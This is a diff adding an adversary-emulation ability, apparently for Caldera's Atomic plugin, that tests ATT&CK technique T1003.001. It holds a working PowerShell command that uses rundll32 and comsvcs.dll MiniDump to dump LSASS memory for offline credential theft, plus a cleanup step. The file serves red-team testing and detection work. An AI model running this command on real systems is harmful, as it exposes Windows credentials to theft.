@@ -1,0 +1,24 @@
+---
+- id: 35d92515122effdd73801c6ac3021da7
+  name: Dump LSASS.exe Memory using comsvcs.dll
+  description: 'The memory of lsass.exe is often dumped for offline credential theft
+    attacks. This can be achieved with a built-in dll.
+
+
+    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll,
+          MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+        payloads: []
+        cleanup: Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
